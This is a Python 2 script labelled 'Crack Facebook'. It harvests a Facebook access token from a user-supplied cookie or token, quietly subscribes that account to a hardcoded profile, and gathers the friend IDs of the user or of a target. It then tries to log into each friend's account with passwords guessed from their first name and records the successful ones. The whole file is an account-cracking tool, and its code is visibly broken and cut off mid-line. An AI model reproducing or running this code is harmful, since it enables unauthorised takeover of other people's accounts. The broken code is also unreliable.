#!/usr/bin/python
# -*- coding: utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
     
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171848;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/243389251;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent','Browser [FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303580;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/0;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]')]

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
def keluar():
	print ("   [!] Exit")
	os.sys.exit()
		
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mHASAN ALBANA \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/pembururondo66/Vj\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""

idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
cekrek = []

def masuk():
    os.system("clear")
    print logo
    print("	\033[1;31mMetode Login Facebook")
    print("\033[1;96m[1] \033[1;93mLogin Token")
    print("\033[1;96m[2] \033[1;93mLogin Cookie")
    print("\033[1;96m[3] \033[1;93mUpdate Script")
    print("\033[1;96m[0] \033[1;97mKeluar")
    pilih_masuk()
        
def pilih_masuk():
    sek=raw_input("\033[1;96m[✺] \033[1;97mChoose : ")
    if sek=="":
        print("   [!] Fill In The Correct")
        masuk()
    elif sek=="1":
        tokenz()
    elif sek=="2":
        cookie()
    elif sek=="3":
        updatesc()
    elif sek=="0":
        keluar()
    else:
        print("   [!] Fill In The Correct")
        masuk()

def tokenz():
    os.system('clear')
    print logo
    toket = raw_input("\033[1;96m[✺] \033[1;93mToken Facebook : \033[1;34m")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\033[1;96m[✓] \033[1;93mBerhasil Login')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        masuk()

def cookie():
	os.system('clear')
	print logo
	try:
		cookie = raw_input("\033[1;96m[✺] \033[1;93mCookie : \033[1;34m")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print('\n   \033[1;96m[✓] \033[1;93mBerhasil Login')
		bot_follow()
	except AttributeError:
		print ("   [!] Cookie Invalid")
		masuk()
	except UnboundLocalError:
		print ("   [!] Cookie Invalid")
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print ("   [!] No Connection")
		keluar()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/100005344214417/subscribers?access_token=' + toket)      
    	menu()
			
def menu():
	os.system('clear')
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print ("   [!] Token Invalid")
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print ("   [!] Token Invalid")
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print ("   [!] No Connection")
		keluar()
	passchoice()
	
def passchoice():
	os.system("clear")
	print logo
	print ("\033[1;34mPILIHAN TARGET")
    	print ("\033[1;96m[1] \033[1;93mCrack Daftar Teman")
    	print ("\033[1;96m[2] \033[1;96mCrack ID publik/Dari Teman")
    	print ("\033[1;96m[0] \033[1;97mKeluar")
	pilih_passxd()
	
def pilih_passxd():
	peak = raw_input("\033[1;96m[✺] \033[1;97mPilih : \033[1;31m")
	if peak =="":
		print ("   [!] Fill In The Correct")
		pilih_passxd()
	elif peak =="1" or peak =="01":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2" or peak =="02":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[✺] \033[1;93mTarget ID : \033[1;97m")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[1;96m[✺] \033[1;93mNama           : \033[1;97m"+sp["name"]
		except KeyError:
			print ("   [!] Wrong ID Target")
			raw_input("\n   [ Back ]")
			menu()
		except requests.exceptions.ConnectionError:
			print ("   [!] No Connection")
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		ids = raw_input("\033[1;96m[✺] \033[1;93mTarget ID : \033[1;97m")
		try:
			pok = requests.get("https://graph.facebook.com/"+ids+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[1;96m[✺] \033[1;93mNama   : \033[1;97m"+sp["name"]
		except KeyError:
			print ("   [!] Wrong ID Target")
			raw_input("\n   [ Back ]")
			menu()
		except requests.exceptions.ConnectionError:
			print ("   [!] No Connection")
			keluar()
		r = requests.get("https://graph.facebook.com/"+ids+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0" or peak =="00":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print ("   [!] Fill In The Correct")
		passchoice()
	
        print "\033[1;96m[✺] \033[1;93mTotal ID       : \033[1;97m"+str(len(id))
	pass3 = raw_input("\033[1;96m[•] \033[1;93mPassword     : \033[1;97m")
	pass4 = raw_input("\033[1;96m[•] \033[1;93mPassword     : \033[1;97m")
    	print ("\033[1;96m[✺] \033[1;31mCrack Mulai...\n")
	print 42*"\033[1;96m="
							
def main(arg):
        global cekpoint,oks
	user = arg
	try:
          os.mkdir('done')
	except OSError:
          pass
        try:
          a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
          b = json.loads(a.text)
          tl = b['birthday']
          pass1 = b['first_name'].lower()+'123'
          rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
          xo = rex.content
          if 'mbasic_logout_button' in xo or 'save-device' in xo:
             print '\x1b[0;32m   [OK] '+user+' • '+pass1+' • '+tl
             oke = open('done/Indo.txt', 'a')
             oke.write('\n[OK] '+user+' • '+pass1)
             oke.close()
             oks.append(user+pass1)
        else :
             if 'checkpoint' in xo:
	         print '\x1b[0;33m   [CP] '+user+' • '+pass1+' • '+tl
                 cek = open('done/Indo.txt', 'a')
                 cek.write('\n[CP] '+user+' • '+pass1)
                 cek.close()
                 cekpoint.append(user+pass1)
        else:
          pass2 = b['first_name'].lower()+'12345'
          rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
             xo = rex.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
                 print '\x1b[0;32m   [OK] '+user+' • '+pass2+' • '+tl
                 oke = open('done/Indo.txt', 'a')
                 oke.write('\n[OK] '+user+' • '+pass2)
                 oke.close()
                 oks.append(user+pass2)
        else:
          if 'checkpoint' in xo:
              print '\x1b[0;33m   [CP] '+user+' • '+pass2+' • '+tl
              cek = open('done/Indo.txt', 'a')
              cek.write('\n[CP] '+user+' • '+pass2)
              cek.close()
              cekpoint.append(user+pass2)
       else:
         pass3 = b['first_name'].lower()
              rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
              xo = rex.content
              if 'mbasic_logout_button' in xo or 'save-device' in xo:
                 print '\x1b[0;32m   [OK] '+user+' • '+pass3+' • '+tl
                 oke = open('done/Indo.txt', 'a')
                 oke.write('\n[OK] '+user+' • '+pass3)
                 oke.close()
                 oks.append(user+pass3)
       else:
         if 'checkpoint' in xo:
             print '\x1b[0;33m   [CP] '+user+' • '+pass3+' • '+tl
             cek = open('done/Indo.txt', 'a')
             cek.write('\n[CP] '+user+' • '+pass3)
             cek.close()
             cekpoint.append(user+pass3)
       else:
           rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
               print '\x1b[0;32m   [OK] '+user+' • '+pass4+' • '+tl
               oke = open('done/Indo.txt', 'a')
oke.write('\n[OK] '+
	
def updatesc():
	os.system("clear")
	banner()
	jalan ("\n   [•] Updating Script...")
	os.system("git pull origin master")
	print ("   [•] Successfully Update")
	raw_input("\n   [ Back ]")
	os.system("python2 fbc")	
	
if __name__ == '__main__':
	menu() 
